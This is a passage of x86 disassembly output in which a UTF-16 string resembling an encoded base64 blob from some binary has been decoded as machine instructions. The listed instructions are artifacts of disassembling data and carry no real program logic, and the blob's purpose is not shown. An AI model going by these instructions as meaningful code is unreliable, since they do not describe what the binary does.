  40aa4b:	00 48 00             	add    %cl,0x0(%eax)
  40aa4e:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40aa52:	4c                   	dec    %esp
  40aa53:	00 30                	add    %dh,(%eax)
  40aa55:	00 71 00             	add    %dh,0x0(%ecx)
  40aa58:	39 00                	cmp    %eax,(%eax)
  40aa5a:	2f                   	das
  40aa5b:	00 52 00             	add    %dl,0x0(%edx)
  40aa5e:	6a 00                	push   $0x0
  40aa60:	38 00                	cmp    %al,(%eax)
  40aa62:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa63:	00 76 00             	add    %dh,0x0(%esi)
  40aa66:	37                   	aaa
  40aa67:	00 69 00             	add    %ch,0x0(%ecx)
  40aa6a:	78 00                	js     0x40aa6c
  40aa6c:	6b 00 56             	imul   $0x56,(%eax),%eax
  40aa6f:	00 58 00             	add    %bl,0x0(%eax)
  40aa72:	68 00 41 00 74       	push   $0x74004100
  40aa77:	00 5a 00             	add    %bl,0x0(%edx)
  40aa7a:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40aa7e:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40aa82:	2f                   	das
  40aa83:	00 6a 00             	add    %ch,0x0(%edx)
  40aa86:	67 00 4f 00          	add    %cl,0x0(%bx)
  40aa8a:	74 00                	je     0x40aa8c
  40aa8c:	6d                   	insl   (%dx),%es:(%edi)
  40aa8d:	00 48 00             	add    %cl,0x0(%eax)
  40aa90:	78 00                	js     0x40aa92
  40aa92:	6a 00                	push   $0x0
  40aa94:	52                   	push   %edx
  40aa95:	00 7a 00             	add    %bh,0x0(%edx)
  40aa98:	51                   	push   %ecx
  40aa99:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40aa9d:	00 53 00             	add    %dl,0x0(%ebx)
  40aaa0:	69 00 61 00 49 00    	imul   $0x490061,(%eax),%eax
  40aaa6:	68 00 4c 00 47       	push   $0x47004c00
  40aaab:	00 48 00             	add    %cl,0x0(%eax)
  40aaae:	42                   	inc    %edx
  40aaaf:	00 57 00             	add    %dl,0x0(%edi)
  40aab2:	37                   	aaa
  40aab3:	00 49 00             	add    %cl,0x0(%ecx)
  40aab6:	49                   	dec    %ecx
  40aab7:	00 47 00             	add    %al,0x0(%edi)
  40aaba:	74 00                	je     0x40aabc
  40aabc:	51                   	push   %ecx
  40aabd:	00 4d 00             	add    %cl,0x0(%ebp)
  40aac0:	34 00                	xor    $0x0,%al
  40aac2:	63 00                	arpl   %eax,(%eax)
  40aac4:	50                   	push   %eax
  40aac5:	00 30                	add    %dh,(%eax)
  40aac7:	00 2f                	add    %ch,(%edi)
  40aac9:	00 62 00             	add    %ah,0x0(%edx)
  40aacc:	4b                   	dec    %ebx
  40aacd:	00 41 00             	add    %al,0x0(%ecx)
  40aad0:	6a 00                	push   $0x0
  40aad2:	47                   	inc    %edi
  40aad3:	00 49 00             	add    %cl,0x0(%ecx)
  40aad6:	44                   	inc    %esp
  40aad7:	00 71 00             	add    %dh,0x0(%ecx)
  40aada:	4b                   	dec    %ebx
  40aadb:	00 7a 00             	add    %bh,0x0(%edx)
  40aade:	50                   	push   %eax
  40aadf:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40aae3:	00 51 00             	add    %dl,0x0(%ecx)
  40aae6:	59                   	pop    %ecx
  40aae7:	00 73 00             	add    %dh,0x0(%ebx)
  40aaea:	39 00                	cmp    %eax,(%eax)
  40aaec:	63 00                	arpl   %eax,(%eax)
  40aaee:	6d                   	insl   (%dx),%es:(%edi)
  40aaef:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40aaf3:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40aaf7:	00 66 00             	add    %ah,0x0(%esi)
  40aafa:	6d                   	insl   (%dx),%es:(%edi)
  40aafb:	00 49 00             	add    %cl,0x0(%ecx)
  40aafe:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40ab02:	47                   	inc    %edi
  40ab03:	00 79 00             	add    %bh,0x0(%ecx)
  40ab06:	77 00                	ja     0x40ab08
  40ab08:	57                   	push   %edi
  40ab09:	00 73 00             	add    %dh,0x0(%ebx)
  40ab0c:	4c                   	dec    %esp
  40ab0d:	00 65 00             	add    %ah,0x0(%ebp)
  40ab10:	30 00                	xor    %al,(%eax)
  40ab12:	2b 00                	sub    (%eax),%eax
  40ab14:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40ab18:	67 00 54 00          	add    %dl,0x0(%si)
  40ab1c:	67 00 64 00          	add    %ah,0x0(%si)
  40ab20:	39 00                	cmp    %eax,(%eax)
  40ab22:	4f                   	dec    %edi
  40ab23:	00 42 00             	add    %al,0x0(%edx)
  40ab26:	59                   	pop    %ecx
  40ab27:	00 5a 00             	add    %bl,0x0(%edx)
  40ab2a:	55                   	push   %ebp
  40ab2b:	00 43 00             	add    %al,0x0(%ebx)
  40ab2e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab2f:	00 67 00             	add    %ah,0x0(%edi)
  40ab32:	2b 00                	sub    (%eax),%eax
  40ab34:	36 00 35 00 2b 00 64 	add    %dh,%ss:0x64002b00
  40ab3b:	00 66 00             	add    %ah,0x0(%esi)
  40ab3e:	6a 00                	push   $0x0
  40ab40:	67 00 75 00          	add    %dh,0x0(%di)
  40ab44:	47                   	inc    %edi
  40ab45:	00 63 00             	add    %ah,0x0(%ebx)
  40ab48:	62 00                	bound  %eax,(%eax)
  40ab4a:	30 00                	xor    %al,(%eax)
  40ab4c:	41                   	inc    %ecx
  40ab4d:	00 50 00             	add    %dl,0x0(%eax)
  40ab50:	4d                   	dec    %ebp
  40ab51:	00 71 00             	add    %dh,0x0(%ecx)
  40ab54:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40ab58:	4b                   	dec    %ebx
  40ab59:	00 76 00             	add    %dh,0x0(%esi)
  40ab5c:	4f                   	dec    %edi
  40ab5d:	00 7a 00             	add    %bh,0x0(%edx)
  40ab60:	30 00                	xor    %al,(%eax)
  40ab62:	2f                   	das
  40ab63:	00 52 00             	add    %dl,0x0(%edx)
  40ab66:	31 00                	xor    %eax,(%eax)
  40ab68:	53                   	push   %ebx
  40ab69:	00 75 00             	add    %dh,0x0(%ebp)
  40ab6c:	71 00                	jno    0x40ab6e
  40ab6e:	2f                   	das
  40ab6f:	00 6a 00             	add    %ch,0x0(%edx)
  40ab72:	67 00 37             	add    %dh,(%bx)
  40ab75:	00 56 00             	add    %dl,0x0(%esi)
  40ab78:	55                   	push   %ebp
  40ab79:	00 61 00             	add    %ah,0x0(%ecx)
  40ab7c:	71 00                	jno    0x40ab7e
  40ab7e:	38 00                	cmp    %al,(%eax)
  40ab80:	4e                   	dec    %esi
  40ab81:	00 48 00             	add    %cl,0x0(%eax)
  40ab84:	61                   	popa
  40ab85:	00 59 00             	add    %bl,0x0(%ecx)
  40ab88:	6d                   	insl   (%dx),%es:(%edi)
  40ab89:	00 76 00             	add    %dh,0x0(%esi)
  40ab8c:	56                   	push   %esi
  40ab8d:	00 7a 00             	add    %bh,0x0(%edx)
  40ab90:	62 00                	bound  %eax,(%eax)
  40ab92:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40ab95:	00 59 00             	add    %bl,0x0(%ecx)
  40ab98:	48                   	dec    %eax
  40ab99:	00 66 00             	add    %ah,0x0(%esi)
  40ab9c:	6b 00 42             	imul   $0x42,(%eax),%eax
  40ab9f:	00 51 00             	add    %dl,0x0(%ecx)
  40aba2:	4d                   	dec    %ebp
  40aba3:	00 79 00             	add    %bh,0x0(%ecx)
  40aba6:	61                   	popa
  40aba7:	00 4d 00             	add    %cl,0x0(%ebp)
  40abaa:	6d                   	insl   (%dx),%es:(%edi)
  40abab:	00 65 00             	add    %ah,0x0(%ebp)
  40abae:	4a                   	dec    %edx
  40abaf:	00 4e 00             	add    %cl,0x0(%esi)
  40abb2:	61                   	popa
  40abb3:	00 2b                	add    %ch,(%ebx)
  40abb5:	00 37                	add    %dh,(%edi)
  40abb7:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40abbb:	00 41 00             	add    %al,0x0(%ecx)
  40abbe:	41                   	inc    %ecx
  40abbf:	00 6b 00             	add    %ch,0x0(%ebx)
  40abc2:	50                   	push   %eax
  40abc3:	00 4f 00             	add    %cl,0x0(%edi)
  40abc6:	6c                   	insb   (%dx),%es:(%edi)
  40abc7:	00 52 00             	add    %dl,0x0(%edx)
  40abca:	68 00 48 00 57       	push   $0x57004800
  40abcf:	00 6a 00             	add    %ch,0x0(%edx)
  40abd2:	53                   	push   %ebx
  40abd3:	00 35 00 4b 00 46    	add    %dh,0x46004b00
  40abd9:	00 69 00             	add    %ch,0x0(%ecx)
  40abdc:	71 00                	jno    0x40abde
  40abde:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40abe2:	41                   	inc    %ecx
  40abe3:	00 4b 00             	add    %cl,0x0(%ebx)
  40abe6:	59                   	pop    %ecx
  40abe7:	00 42 00             	add    %al,0x0(%edx)
  40abea:	36 00 44 00 2f       	add    %al,%ss:0x2f(%eax,%eax,1)
  40abef:	00 43 00             	add    %al,0x0(%ebx)
  40abf2:	4b                   	dec    %ebx
  40abf3:	00 33                	add    %dh,(%ebx)
  40abf5:	00 58 00             	add    %bl,0x0(%eax)
  40abf8:	2f                   	das
  40abf9:	00 79 00             	add    %bh,0x0(%ecx)
  40abfc:	50                   	push   %eax
  40abfd:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac00:	53                   	push   %ebx
  40ac01:	00 69 00             	add    %ch,0x0(%ecx)
  40ac04:	73 00                	jae    0x40ac06
  40ac06:	56                   	push   %esi
  40ac07:	00 33                	add    %dh,(%ebx)
  40ac09:	00 75 00             	add    %dh,0x0(%ebp)
  40ac0c:	74 00                	je     0x40ac0e
  40ac0e:	6b 00 71             	imul   $0x71,(%eax),%eax
  40ac11:	00 67 00             	add    %ah,0x0(%edi)
  40ac14:	37                   	aaa
  40ac15:	00 49 00             	add    %cl,0x0(%ecx)
  40ac18:	4f                   	dec    %edi
  40ac19:	00 62 00             	add    %ah,0x0(%edx)
  40ac1c:	70 00                	jo     0x40ac1e
  40ac1e:	61                   	popa
  40ac1f:	00 41 00             	add    %al,0x0(%ecx)
  40ac22:	46                   	inc    %esi
  40ac23:	00 55 00             	add    %dl,0x0(%ebp)
  40ac26:	57                   	push   %edi
  40ac27:	00 65 00             	add    %ah,0x0(%ebp)
  40ac2a:	53                   	push   %ebx
  40ac2b:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40ac2f:	00 79 00             	add    %bh,0x0(%ecx)
  40ac32:	37                   	aaa
  40ac33:	00 4f 00             	add    %cl,0x0(%edi)
  40ac36:	58                   	pop    %eax
  40ac37:	00 51 00             	add    %dl,0x0(%ecx)
  40ac3a:	62 00                	bound  %eax,(%eax)
  40ac3c:	6c                   	insb   (%dx),%es:(%edi)
  40ac3d:	00 46 00             	add    %al,0x0(%esi)
  40ac40:	6b 00 72             	imul   $0x72,(%eax),%eax
  40ac43:	00 73 00             	add    %dh,0x0(%ebx)
  40ac46:	31 00                	xor    %eax,(%eax)
  40ac48:	7a 00                	jp     0x40ac4a
  40ac4a:	48                   	dec    %eax
  40ac4b:	00 61 00             	add    %ah,0x0(%ecx)
  40ac4e:	4a                   	dec    %edx
  40ac4f:	00 53 00             	add    %dl,0x0(%ebx)
  40ac52:	2b 00                	sub    (%eax),%eax
  40ac54:	78 00                	js     0x40ac56
  40ac56:	43                   	inc    %ebx
  40ac57:	00 33                	add    %dh,(%ebx)
  40ac59:	00 67 00             	add    %ah,0x0(%edi)
  40ac5c:	37                   	aaa
  40ac5d:	00 48 00             	add    %cl,0x0(%eax)
  40ac60:	43                   	inc    %ebx
  40ac61:	00 67 00             	add    %ah,0x0(%edi)
  40ac64:	32 00                	xor    (%eax),%al
  40ac66:	73 00                	jae    0x40ac68
  40ac68:	31 00                	xor    %eax,(%eax)
  40ac6a:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40ac6d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40ac71:	00 50 00             	add    %dl,0x0(%eax)
  40ac74:	77 00                	ja     0x40ac76
  40ac76:	71 00                	jno    0x40ac78
  40ac78:	4e                   	dec    %esi
  40ac79:	00 33                	add    %dh,(%ebx)
  40ac7b:	00 6f 00             	add    %ch,0x0(%edi)
  40ac7e:	35 00 34 00 31       	xor    $0x31003400,%eax
  40ac83:	00 5a 00             	add    %bl,0x0(%edx)
  40ac86:	71 00                	jno    0x40ac88
  40ac88:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40ac8c:	31 00                	xor    %eax,(%eax)
  40ac8e:	51                   	push   %ecx
  40ac8f:	00 2f                	add    %ch,(%edi)
  40ac91:	00 72 00             	add    %dh,0x0(%edx)
  40ac94:	74 00                	je     0x40ac96
  40ac96:	46                   	inc    %esi
  40ac97:	00 48 00             	add    %cl,0x0(%eax)
  40ac9a:	58                   	pop    %eax
  40ac9b:	00 76 00             	add    %dh,0x0(%esi)
  40ac9e:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40aca2:	37                   	aaa
  40aca3:	00 49 00             	add    %cl,0x0(%ecx)
  40aca6:	41                   	inc    %ecx
  40aca7:	00 6d 00             	add    %ch,0x0(%ebp)
  40acaa:	71 00                	jno    0x40acac
  40acac:	75 00                	jne    0x40acae
  40acae:	4b                   	dec    %ebx
  40acaf:	00 67 00             	add    %ah,0x0(%edi)
  40acb2:	30 00                	xor    %al,(%eax)
  40acb4:	74 00                	je     0x40acb6
  40acb6:	49                   	dec    %ecx
  40acb7:	00 6b 00             	add    %ch,0x0(%ebx)
  40acba:	6a 00                	push   $0x0
  40acbc:	75 00                	jne    0x40acbe
  40acbe:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40acc2:	44                   	inc    %esp
  40acc3:	00 78 00             	add    %bh,0x0(%eax)
  40acc6:	63 00                	arpl   %eax,(%eax)
  40acc8:	31 00                	xor    %eax,(%eax)
  40acca:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40acce:	4c                   	dec    %esp
  40accf:	00 6b 00             	add    %ch,0x0(%ebx)
  40acd2:	33 00                	xor    (%eax),%eax
  40acd4:	58                   	pop    %eax
  40acd5:	00 38                	add    %bh,(%eax)
  40acd7:	00 42 00             	add    %al,0x0(%edx)
  40acda:	72 00                	jb     0x40acdc
  40acdc:	7a 00                	jp     0x40acde
  40acde:	51                   	push   %ecx
  40acdf:	00 2f                	add    %ch,(%edi)
  40ace1:	00 55 00             	add    %dl,0x0(%ebp)
  40ace4:	78 00                	js     0x40ace6
  40ace6:	59                   	pop    %ecx
  40ace7:	00 76 00             	add    %dh,0x0(%esi)
  40acea:	70 00                	jo     0x40acec
  40acec:	72 00                	jb     0x40acee
  40acee:	33 00                	xor    (%eax),%eax
  40acf0:	5a                   	pop    %edx
  40acf1:	00 4a 00             	add    %cl,0x0(%edx)
  40acf4:	79 00                	jns    0x40acf6
  40acf6:	68 00 4b 00 65       	push   $0x65004b00
  40acfb:	00 61 00             	add    %ah,0x0(%ecx)
  40acfe:	62 00                	bound  %eax,(%eax)
  40ad00:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad01:	00 50 00             	add    %dl,0x0(%eax)
  40ad04:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad05:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad08:	41                   	inc    %ecx
  40ad09:	00 41 00             	add    %al,0x0(%ecx)
  40ad0c:	6d                   	insl   (%dx),%es:(%edi)
  40ad0d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad10:	63 00                	arpl   %eax,(%eax)
  40ad12:	42                   	inc    %edx
  40ad13:	00 6f 00             	add    %ch,0x0(%edi)
  40ad16:	6c                   	insb   (%dx),%es:(%edi)
  40ad17:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40ad1b:	00 31                	add    %dh,(%ecx)
  40ad1d:	00 69 00             	add    %ch,0x0(%ecx)
  40ad20:	63 00                	arpl   %eax,(%eax)
  40ad22:	74 00                	je     0x40ad24
  40ad24:	36 00 32             	add    %dh,%ss:(%edx)
  40ad27:	00 43 00             	add    %al,0x0(%ebx)
  40ad2a:	45                   	inc    %ebp
  40ad2b:	00 53 00             	add    %dl,0x0(%ebx)
  40ad2e:	6d                   	insl   (%dx),%es:(%edi)
  40ad2f:	00 4a 00             	add    %cl,0x0(%edx)
  40ad32:	2f                   	das
  40ad33:	00 51 00             	add    %dl,0x0(%ecx)
  40ad36:	75 00                	jne    0x40ad38
  40ad38:	2f                   	das
  40ad39:	00 45 00             	add    %al,0x0(%ebp)
  40ad3c:	42                   	inc    %edx
  40ad3d:	00 4a 00             	add    %cl,0x0(%edx)
  40ad40:	74 00                	je     0x40ad42
  40ad42:	55                   	push   %ebp
  40ad43:	00 65 00             	add    %ah,0x0(%ebp)
  40ad46:	6d                   	insl   (%dx),%es:(%edi)
  40ad47:	00 62 00             	add    %ah,0x0(%edx)
  40ad4a:	54                   	push   %esp
  40ad4b:	00 31                	add    %dh,(%ecx)
  40ad4d:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40ad51:	00 58 00             	add    %bl,0x0(%eax)
  40ad54:	48                   	dec    %eax
  40ad55:	00 56 00             	add    %dl,0x0(%esi)
  40ad58:	61                   	popa
  40ad59:	00 6f 00             	add    %ch,0x0(%edi)
  40ad5c:	31 00                	xor    %eax,(%eax)
  40ad5e:	69 00 48 00 42 00    	imul   $0x420048,(%eax),%eax
  40ad64:	54                   	push   %esp
  40ad65:	00 75 00             	add    %dh,0x0(%ebp)
  40ad68:	4f                   	dec    %edi
  40ad69:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad6c:	69 00 6c 00 5a 00    	imul   $0x5a006c,(%eax),%eax
  40ad72:	5a                   	pop    %edx
  40ad73:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40ad77:	00 63 00             	add    %ah,0x0(%ebx)
  40ad7a:	33 00                	xor    (%eax),%eax
  40ad7c:	76 00                	jbe    0x40ad7e
  40ad7e:	79 00                	jns    0x40ad80
  40ad80:	53                   	push   %ebx
  40ad81:	00 69 00             	add    %ch,0x0(%ecx)
  40ad84:	2f                   	das
  40ad85:	00 6f 00             	add    %ch,0x0(%edi)
  40ad88:	51                   	push   %ecx
  40ad89:	00 78 00             	add    %bh,0x0(%eax)
  40ad8c:	51                   	push   %ecx
  40ad8d:	00 77 00             	add    %dh,0x0(%edi)
  40ad90:	6a 00                	push   $0x0
  40ad92:	32 00                	xor    (%eax),%al
  40ad94:	74 00                	je     0x40ad96
  40ad96:	34 00                	xor    $0x0,%al
  40ad98:	58                   	pop    %eax
  40ad99:	00 51 00             	add    %dl,0x0(%ecx)
  40ad9c:	34 00                	xor    $0x0,%al
  40ad9e:	41                   	inc    %ecx
  40ad9f:	00 68 00             	add    %ch,0x0(%eax)
  40ada2:	54                   	push   %esp
  40ada3:	00 46 00             	add    %al,0x0(%esi)
  40ada6:	6f                   	outsl  %ds:(%esi),(%dx)
  40ada7:	00 78 00             	add    %bh,0x0(%eax)
  40adaa:	61                   	popa
  40adab:	00 79 00             	add    %bh,0x0(%ecx)
  40adae:	54                   	push   %esp
  40adaf:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40adb3:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40adb7:	00 76 00             	add    %dh,0x0(%esi)
  40adba:	5a                   	pop    %edx
  40adbb:	00 63 00             	add    %ah,0x0(%ebx)
  40adbe:	68 00 6b 00 6e       	push   $0x6e006b00
  40adc3:	00 55 00             	add    %dl,0x0(%ebp)
  40adc6:	72 00                	jb     0x40adc8
  40adc8:	71 00                	jno    0x40adca
  40adca:	46                   	inc    %esi
  40adcb:	00 6d 00             	add    %ch,0x0(%ebp)
  40adce:	51                   	push   %ecx
  40adcf:	00 4d 00             	add    %cl,0x0(%ebp)
  40add2:	6d                   	insl   (%dx),%es:(%edi)
  40add3:	00 52 00             	add    %dl,0x0(%edx)
  40add6:	78 00                	js     0x40add8
  40add8:	6c                   	insb   (%dx),%es:(%edi)
  40add9:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40addd:	00 45 00             	add    %al,0x0(%ebp)
  40ade0:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40ade4:	78 00                	js     0x40ade6
  40ade6:	55                   	push   %ebp
  40ade7:	00 68 00             	add    %ch,0x0(%eax)
  40adea:	31 00                	xor    %eax,(%eax)
  40adec:	31 00                	xor    %eax,(%eax)
  40adee:	63 00                	arpl   %eax,(%eax)
  40adf0:	53                   	push   %ebx
  40adf1:	00 62 00             	add    %ah,0x0(%edx)
  40adf4:	77 00                	ja     0x40adf6
  40adf6:	4b                   	dec    %ebx
  40adf7:	00 47 00             	add    %al,0x0(%edi)
  40adfa:	4f                   	dec    %edi
  40adfb:	00 6e 00             	add    %ch,0x0(%esi)
  40adfe:	2b 00                	sub    (%eax),%eax
  40ae00:	48                   	dec    %eax
  40ae01:	00 68 00             	add    %ch,0x0(%eax)
  40ae04:	6d                   	insl   (%dx),%es:(%edi)
  40ae05:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40ae09:	00 36                	add    %dh,(%esi)
  40ae0b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae0e:	51                   	push   %ecx
  40ae0f:	00 38                	add    %bh,(%eax)
  40ae11:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae14:	41                   	inc    %ecx
  40ae15:	00 78 00             	add    %bh,0x0(%eax)
  40ae18:	32 00                	xor    (%eax),%al
  40ae1a:	65 00 36             	add    %dh,%gs:(%esi)
  40ae1d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae20:	68 00 5a 00 64       	push   $0x64005a00
  40ae25:	00 46 00             	add    %al,0x0(%esi)
  40ae28:	70 00                	jo     0x40ae2a
  40ae2a:	38 00                	cmp    %al,(%eax)
  40ae2c:	45                   	inc    %ebp
  40ae2d:	00 2f                	add    %ch,(%edi)
  40ae2f:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae32:	33 00                	xor    (%eax),%eax
  40ae34:	74 00                	je     0x40ae36
  40ae36:	6a 00                	push   $0x0
  40ae38:	73 00                	jae    0x40ae3a
  40ae3a:	39 00                	cmp    %eax,(%eax)
  40ae3c:	4e                   	dec    %esi
  40ae3d:	00 45 00             	add    %al,0x0(%ebp)
  40ae40:	50                   	push   %eax
  40ae41:	00 66 00             	add    %ah,0x0(%esi)
  40ae44:	58                   	pop    %eax
  40ae45:	00 67 00             	add    %ah,0x0(%edi)
  40ae48:	4c                   	dec    %esp
  40ae49:	00 78 00             	add    %bh,0x0(%eax)
  40ae4c:	37                   	aaa
  40ae4d:	00 42 00             	add    %al,0x0(%edx)
  40ae50:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae51:	00 46 00             	add    %al,0x0(%esi)
  40ae54:	4d                   	dec    %ebp
  40ae55:	00 39                	add    %bh,(%ecx)
  40ae57:	00 46 00             	add    %al,0x0(%esi)
  40ae5a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae5b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae5e:	79 00                	jns    0x40ae60
  40ae60:	74 00                	je     0x40ae62
  40ae62:	77 00                	ja     0x40ae64
  40ae64:	39 00                	cmp    %eax,(%eax)
  40ae66:	44                   	inc    %esp
  40ae67:	00 66 00             	add    %ah,0x0(%esi)
  40ae6a:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40ae6e:	35 00 75 00 78       	xor    $0x78007500,%eax
  40ae73:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40ae77:	00 36                	add    %dh,(%esi)
  40ae79:	00 6e 00             	add    %ch,0x0(%esi)
  40ae7c:	35 00 6b 00 71       	xor    $0x71006b00,%eax
  40ae81:	00 51 00             	add    %dl,0x0(%ecx)
  40ae84:	34 00                	xor    $0x0,%al
  40ae86:	39 00                	cmp    %eax,(%eax)
  40ae88:	41                   	inc    %ecx
  40ae89:	00 76 00             	add    %dh,0x0(%esi)
  40ae8c:	51                   	push   %ecx
  40ae8d:	00 58 00             	add    %bl,0x0(%eax)
  40ae90:	78 00                	js     0x40ae92
  40ae92:	52                   	push   %edx
  40ae93:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ae97:	00 66 00             	add    %ah,0x0(%esi)
  40ae9a:	41                   	inc    %ecx
  40ae9b:	00 33                	add    %dh,(%ebx)
  40ae9d:	00 6d 00             	add    %ch,0x0(%ebp)
  40aea0:	2f                   	das
  40aea1:	00 73 00             	add    %dh,0x0(%ebx)
  40aea4:	56                   	push   %esi
  40aea5:	00 6f 00             	add    %ch,0x0(%edi)
  40aea8:	39 00                	cmp    %eax,(%eax)
  40aeaa:	45                   	inc    %ebp
  40aeab:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40aeaf:	00 78 00             	add    %bh,0x0(%eax)
  40aeb2:	4d                   	dec    %ebp
  40aeb3:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40aeb7:	00 37                	add    %dh,(%edi)
  40aeb9:	00 61 00             	add    %ah,0x0(%ecx)
  40aebc:	46                   	inc    %esi
  40aebd:	00 69 00             	add    %ch,0x0(%ecx)
  40aec0:	43                   	inc    %ebx
  40aec1:	00 2b                	add    %ch,(%ebx)
  40aec3:	00 59 00             	add    %bl,0x0(%ecx)
  40aec6:	33 00                	xor    (%eax),%eax
  40aec8:	71 00                	jno    0x40aeca
  40aeca:	46                   	inc    %esi
  40aecb:	00 6d 00             	add    %ch,0x0(%ebp)
  40aece:	71 00                	jno    0x40aed0
  40aed0:	50                   	push   %eax
  40aed1:	00 32                	add    %dh,(%edx)
  40aed3:	00 2b                	add    %ch,(%ebx)
  40aed5:	00 71 00             	add    %dh,0x0(%ecx)
  40aed8:	6c                   	insb   (%dx),%es:(%edi)
  40aed9:	00 52 00             	add    %dl,0x0(%edx)
  40aedc:	42                   	inc    %edx
  40aedd:	00 6d 00             	add    %ch,0x0(%ebp)
  40aee0:	6a 00                	push   $0x0
  40aee2:	52                   	push   %edx
  40aee3:	00 57 00             	add    %dl,0x0(%edi)
  40aee6:	62 00                	bound  %eax,(%eax)
  40aee8:	59                   	pop    %ecx
  40aee9:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40aeed:	00 51 00             	add    %dl,0x0(%ecx)
  40aef0:	65 00 33             	add    %dh,%gs:(%ebx)
  40aef3:	00 4f 00             	add    %cl,0x0(%edi)
  40aef6:	43                   	inc    %ebx
  40aef7:	00 7a 00             	add    %bh,0x0(%edx)
  40aefa:	33 00                	xor    (%eax),%eax
  40aefc:	57                   	push   %edi
  40aefd:	00 72 00             	add    %dh,0x0(%edx)
  40af00:	72 00                	jb     0x40af02
  40af02:	39 00                	cmp    %eax,(%eax)
  40af04:	2b 00                	sub    (%eax),%eax
  40af06:	4c                   	dec    %esp
  40af07:	00 6e 00             	add    %ch,0x0(%esi)
  40af0a:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40af0d:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40af11:	00 78 00             	add    %bh,0x0(%eax)
  40af14:	45                   	inc    %ebp
  40af15:	00 61 00             	add    %ah,0x0(%ecx)
  40af18:	6c                   	insb   (%dx),%es:(%edi)
  40af19:	00 65 00             	add    %ah,0x0(%ebp)
  40af1c:	72 00                	jb     0x40af1e
  40af1e:	76 00                	jbe    0x40af20
  40af20:	68 00 31 00 70       	push   $0x70003100
  40af25:	00 38                	add    %bh,(%eax)
  40af27:	00 69 00             	add    %ch,0x0(%ecx)
  40af2a:	71 00                	jno    0x40af2c
  40af2c:	65 00 2b             	add    %ch,%gs:(%ebx)
  40af2f:	00 52 00             	add    %dl,0x0(%edx)
  40af32:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40af36:	48                   	dec    %eax
  40af37:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40af3b:	00 67 00             	add    %ah,0x0(%edi)
  40af3e:	57                   	push   %edi
  40af3f:	00 46 00             	add    %al,0x0(%esi)
  40af42:	2b 00                	sub    (%eax),%eax
  40af44:	33 00                	xor    (%eax),%eax
  40af46:	2f                   	das
  40af47:	00 39                	add    %bh,(%ecx)
  40af49:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af4c:	79 00                	jns    0x40af4e
  40af4e:	42                   	inc    %edx
  40af4f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af52:	41                   	inc    %ecx
  40af53:	00 71 00             	add    %dh,0x0(%ecx)
  40af56:	58                   	pop    %eax
  40af57:	00 32                	add    %dh,(%edx)
  40af59:	00 65 00             	add    %ah,0x0(%ebp)
  40af5c:	65 00 31             	add    %dh,%gs:(%ecx)
  40af5f:	00 78 00             	add    %bh,0x0(%eax)
  40af62:	32 00                	xor    (%eax),%al
  40af64:	45                   	inc    %ebp
  40af65:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40af69:	00 37                	add    %dh,(%edi)
  40af6b:	00 51 00             	add    %dl,0x0(%ecx)
  40af6e:	7a 00                	jp     0x40af70
  40af70:	47                   	inc    %edi
  40af71:	00 7a 00             	add    %bh,0x0(%edx)
  40af74:	42                   	inc    %edx
  40af75:	00 55 00             	add    %dl,0x0(%ebp)
  40af78:	7a 00                	jp     0x40af7a
  40af7a:	68 00 7a 00 41       	push   $0x41007a00
  40af7f:	00 4d 00             	add    %cl,0x0(%ebp)
  40af82:	68 00 6a 00 54       	push   $0x54006a00
  40af87:	00 79 00             	add    %bh,0x0(%ecx)
  40af8a:	56                   	push   %esi
